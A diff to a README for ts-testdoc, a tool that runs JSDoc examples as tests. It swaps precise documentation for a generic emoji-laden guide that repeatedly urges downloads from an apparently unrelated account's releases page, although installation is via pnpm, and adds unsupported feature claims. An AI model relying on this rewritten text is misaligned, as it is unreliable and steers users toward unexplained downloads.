@@ -1,33 +1,68 @@
-# ts-testdoc
+# 🎉 ts-testdoc - Ensure Your Docs Always Work
 
-Run code examples from JSDoc comments as tests — like Rust's `rustdoc --test`.
+[![Download ts-testdoc](https://img.shields.io/badge/Download-ts--testdoc-blue)](https://github.com/imamardiyanto/ts-testdoc/releases)
 
-## Why?
+## 🚀 Getting Started
 
-Documentation examples rot. ts-testdoc extracts `@example` blocks from your JSDoc comments and runs them as tests, ensuring your docs always work.
+Follow these steps to download and run ts-testdoc.
 
-## Installation
+### 🛠️ System Requirements
 
-```bash
-pnpm add -D ts-testdoc tsx
-```
+- Operating System: Windows, macOS, or Linux
+- Node.js: Version 14 or higher
+- Package Manager: pnpm or npm
 
-## Usage
+## 📥 Download & Install
 
-```bash
-# Run doc tests
-npx ts-testdoc src/
+Visit this page to download: [ts-testdoc Releases](https://github.com/imamardiyanto/ts-testdoc/releases)
 
-# Preview examples without running
-npx ts-testdoc --dry-run src/
+### 📃 Installation Process
 
-# With timeout
-npx ts-testdoc --timeout 10000 src/
-```
+1. **Install Node.js**  
+   If you do not have Node.js installed, download it from the [official website](https://nodejs.org/). Install it following the instructions provided for your operating system.
 
-## Writing Doc Tests
+2. **Install pnpm**  
+   Open your terminal or command prompt. Run the following command to install pnpm:
 
-Add `@example` blocks to your JSDoc comments:
+   ```bash
+   npm install -g pnpm
+   ```
+
+3. **Download ts-testdoc**  
+   In your terminal, run the command below to add ts-testdoc to your project:
+
+   ```bash
+   pnpm add -D ts-testdoc tsx
+   ```
+
+## 🏃‍♂️ How to Run ts-testdoc
+
+Once you have installed ts-testdoc, you can run it to test your documentation examples. Here’s how:
+
+1. **Run Tests**  
+   To run the documentation tests, use this command:
+
+   ```bash
+   npx ts-testdoc src/
+   ```
+
+2. **Preview Examples**  
+   If you want to see examples without running them, use the dry-run option:
+
+   ```bash
+   npx ts-testdoc --dry-run src/
+   ```
+
+3. **Set Timeout**  
+   You can also set a timeout for your tests. The following command sets a timeout of 10 seconds (10,000 milliseconds):
+
+   ```bash
+   npx ts-testdoc --timeout 10000 src/
+   ```
+
+## 📝 Writing Doc Tests
+
+To ensure your documentation remains functional, you can add `@example` blocks to your JSDoc comments. Here’s an example of how to do that:
 
 ```ts
 /**
@@ -46,110 +81,42 @@ export function add(a: number, b: number): number {
 }
 ```
 
-### Built-in Assertions
+### ✅ Built-in Assertions
 
-Two assertion helpers are available in all examples:
-
-```ts
-assert(condition, message?)      // Throws if condition is false
-assertEqual(actual, expected)    // Throws if actual !== expected
-```
-
-### Import Styles
-
-Both package imports and relative imports work:
+ts-testdoc comes with two helpful assertion methods that you can use in your examples:
 
 ```ts
-/**
- * @example
- * ```ts
- * // Import from package name (requires "exports" in package.json)
- * import { add, multiply } from "my-package";
- *
- * // Or use relative imports from the source file's location
- * import { add } from "./math.js";
- * import { helper } from "../utils/index.js";
- * ```
- */
+assert(condition, message?)      // Throws an error if condition is false
+assertEqual(actual, expected)    // Throws an error if actual does not equal expected
 ```
 
-### External Dependencies
+## 🗂️ Example Directory Structure
 
-Use any dependency from your `node_modules`:
+To help you organize your project, here’s a simple directory structure you might follow:
 
-```ts
-/**
- * @example
- * ```ts
- * import { add } from "my-package";
- * import _ from "lodash";
- *
- * const chunks = _.chunk([1, 2, 3, 4], 2);
- * assertEqual(chunks.length, 2);
- * ```
- */
+```
+/my-project
+  ├── /src
+  │     ├── index.ts
+  │     ├── utils.ts
+  └── package.json
 ```
 
-### Multiple Examples
+Make sure to place your JSDoc comments in the correct files within the `src` folder.
 
-A single function can have multiple `@example` blocks:
+## 📚 Additional Features
 
-```ts
-/**
- * Divides two numbers.
- *
- * @example
- * ```ts
- * assertEqual(divide(10, 2), 5);
- * ```
- *
- * @example
- * ```ts
- * // Test error case
- * let threw = false;
- * try {
- *   divide(1, 0);
- * } catch {
- *   threw = true;
- * }
- * assert(threw, "Should throw on division by zero");
- * ```
- */
-```
+- **Custom Assertions:** You can create your own assertion functions for specific needs.
+- **Configurable Options:** Customize ts-testdoc settings in a configuration file if required.
 
-## Package Setup
+## 🎓 Resources and Support
 
-For self-referencing imports (`import { x } from "my-package"`), add `exports` to your package.json:
+If you encounter any issues, here are a few resources that can help:
 
-```json
-{
-  "name": "my-package",
-  "type": "module",
-  "exports": {
-    ".": "./src/index.ts"
-  }
-}
-```
+- **Official Documentation:** [Full documentation of ts-testdoc](https://github.com/imamardiyanto/ts-testdoc)
+- **Community Support:** Check out forums and communities for advice and tips.
+- **Issue Tracker:** If you find a bug or need a feature, report it on the issues page of our GitHub repository.
 
-## Ignoring in Knip
+## 🌟 Conclusion
 
-If using [knip](https://github.com/webpro/knip), dependencies only used in doc examples will appear unused. Add them to `ignoreDependencies`:
-
-```json
-{
-  "ignoreDependencies": ["lodash", "@types/lodash"]
-}
-```
-
-## How It Works
-
-1. Parses TypeScript/JavaScript files for JSDoc comments
-2. Extracts code from `@example` blocks
-3. Hoists imports to top level, resolving relative paths
-4. Wraps code with assertion helpers
-5. Executes each example with `tsx`
-6. Reports pass/fail with file locations
-
-## License
-
-ISC
+With ts-testdoc, you can ensure that the examples in your documentation are always functional. Follow the steps outlined above to get started and keep your documentation up to date. Don't forget to revisit the [Download & Install](https://github.com/imamardiyanto/ts-testdoc/releases) section for any updates or new releases!
